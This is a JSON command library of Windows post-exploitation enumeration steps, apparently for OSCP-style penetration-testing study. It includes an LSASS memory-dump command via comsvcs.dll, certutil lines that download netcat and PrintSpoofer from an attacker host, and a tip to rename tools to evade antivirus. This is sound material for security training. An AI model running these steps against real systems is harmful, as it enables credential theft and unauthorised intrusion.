{
  "category": "post-exploit",
  "subcategory": "enumeration",
  "description": "Windows post-exploitation enumeration commands for system info, privileges, and services",
  "commands": [
    {
      "id": "whoami-priv-backup",
      "name": "Check Backup and Debug Privileges",
      "category": "post-exploit",
      "command": "whoami /priv | findstr -i \"backup debug impersonate\"",
      "description": "Check for SeBackupPrivilege, SeDebugPrivilege, and SeImpersonatePrivilege",
      "tags": ["ENUMERATION", "WINDOWS", "PRIVILEGES", "OSCP:HIGH"],
      "variables": [],
      "success_indicators": ["SeBackupPrivilege", "SeDebugPrivilege", "SeImpersonatePrivilege", "Enabled"],
      "failure_indicators": ["Disabled", "not found"],
      "notes": "SeBackupPrivilege: Read any file (SAM extraction). SeDebugPrivilege: Debug processes (LSASS dump). SeImpersonatePrivilege: Token impersonation (Potato attacks).",
      "oscp_relevance": "high",
      "filled_example": "whoami /priv | findstr -i \"backup debug impersonate\""
    },
    {
      "id": "systeminfo-version",
      "name": "Windows Version Information",
      "category": "post-exploit",
      "command": "systeminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\"",
      "description": "Get Windows OS name and version for exploit selection",
      "tags": ["ENUMERATION", "WINDOWS", "VERSION", "OSCP:HIGH"],
      "variables": [],
      "success_indicators": ["OS Name:", "OS Version:"],
      "failure_indicators": [],
      "notes": "Critical for privesc tool selection. Server 2019+ use PrintSpoofer/GodPotato. Server 2016 and earlier use JuicyPotato. Version determines available exploits.",
      "oscp_relevance": "high",
      "filled_example": "systeminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\""
    },
    {
      "id": "wmic-os-version",
      "name": "WMIC OS Version Query",
      "category": "post-exploit",
      "command": "wmic os get caption,version",
      "description": "Get Windows version using WMI (alternative to systeminfo)",
      "tags": ["ENUMERATION", "WINDOWS", "WMIC", "VERSION", "OSCP:HIGH"],
      "variables": [],
      "success_indicators": ["Microsoft Windows Server", "Caption", "Version"],
      "failure_indicators": ["Invalid alias", "Access denied"],
      "notes": "Faster than systeminfo. Shows exact build number for kernel exploit selection. 10.0.17763 = Server 2019. 10.0.14393 = Server 2016.",
      "oscp_relevance": "high",
      "filled_example": "wmic os get caption,version"
    },
    {
      "id": "spooler-status",
      "name": "Print Spooler Service Status",
      "category": "post-exploit",
      "command": "sc query spooler",
      "description": "Check if Print Spooler service is running (required for PrintSpoofer)",
      "tags": ["ENUMERATION", "WINDOWS", "SERVICES", "PRINTSPOOFER", "OSCP:HIGH"],
      "variables": [],
      "success_indicators": ["STATE: RUNNING", "4  RUNNING"],
      "failure_indicators": ["STATE: STOPPED", "FAILED", "service does not exist"],
      "notes": "PrintSpoofer requires Spooler service running. If stopped/disabled, use GodPotato or SweetPotato instead. Post-PrintNightmare many environments disable Spooler.",
      "oscp_relevance": "high",
      "filled_example": "sc query spooler"
    },
    {
      "id": "hostname-domain",
      "name": "Hostname and Domain Info",
      "category": "post-exploit",
      "command": "hostname && echo %userdomain%",
      "description": "Get machine hostname and domain/workgroup name",
      "tags": ["ENUMERATION", "WINDOWS", "DOMAIN", "OSCP:MEDIUM"],
      "variables": [],
      "success_indicators": ["hostname output", "domain name"],
      "failure_indicators": [],
      "notes": "Quick context check. Domain name needed for Impacket tools. WORKGROUP indicates standalone/not domain-joined.",
      "oscp_relevance": "medium",
      "filled_example": "hostname && echo %userdomain%"
    },
    {
      "id": "tasklist-lsass",
      "name": "Get LSASS Process ID",
      "category": "post-exploit",
      "command": "tasklist /fi \"imagename eq lsass.exe\"",
      "description": "Find LSASS process ID for memory dump extraction",
      "tags": ["ENUMERATION", "WINDOWS", "LSASS", "CREDENTIAL_EXTRACTION", "OSCP:HIGH"],
      "variables": [],
      "success_indicators": ["lsass.exe", "PID"],
      "failure_indicators": ["No tasks running", "Access denied"],
      "notes": "PID needed for comsvcs.dll MiniDump. LSASS typically PID 500-800. Use PID with: rundll32 comsvcs.dll, MiniDump <PID> lsass.dmp full",
      "oscp_relevance": "high",
      "filled_example": "tasklist /fi \"imagename eq lsass.exe\""
    },
    {
      "id": "netcat-upload",
      "name": "Certutil Download Netcat",
      "category": "post-exploit",
      "command": "certutil -urlcache -f http://<LHOST>/nc.exe C:\\Windows\\Temp\\nc.exe",
      "description": "Download netcat to target using certutil (built-in Windows tool)",
      "tags": ["FILE_TRANSFER", "WINDOWS", "CERTUTIL", "OSCP:HIGH"],
      "variables": [
        {"name": "<LHOST>", "description": "Attacker IP hosting nc.exe", "example": "10.10.14.5", "required": true}
      ],
      "flag_explanations": {
        "-urlcache": "Use URL cache mode",
        "-f": "Force overwrite existing file"
      },
      "success_indicators": ["CertUtil: -URLCache command completed successfully"],
      "failure_indicators": ["failed to retrieve", "Access denied"],
      "notes": "Living-off-the-land download. Start web server first: python3 -m http.server 80. Alternative: PowerShell IWR, bitsadmin, or SMB copy.",
      "oscp_relevance": "high",
      "filled_example": "certutil -urlcache -f http://10.10.14.5/nc.exe C:\\Windows\\Temp\\nc.exe"
    },
    {
      "id": "certutil-download",
      "name": "Certutil Download File",
      "category": "post-exploit",
      "command": "certutil -urlcache -f http://<LHOST>/<FILE> <DEST_PATH>",
      "description": "Download any file to target using certutil",
      "tags": ["FILE_TRANSFER", "WINDOWS", "CERTUTIL", "OSCP:HIGH"],
      "variables": [
        {"name": "<LHOST>", "description": "Attacker IP", "example": "10.10.14.5", "required": true},
        {"name": "<FILE>", "description": "Filename on web server", "example": "PrintSpoofer64.exe", "required": true},
        {"name": "<DEST_PATH>", "description": "Destination path on target", "example": "C:\\Windows\\Temp\\ps.exe", "required": true}
      ],
      "notes": "Universal Windows download method. Works on most Windows versions. May trigger AV if downloading known tools - consider renaming.",
      "oscp_relevance": "high",
      "filled_example": "certutil -urlcache -f http://10.10.14.5/PrintSpoofer64.exe C:\\Windows\\Temp\\ps.exe"
    }
  ]
}
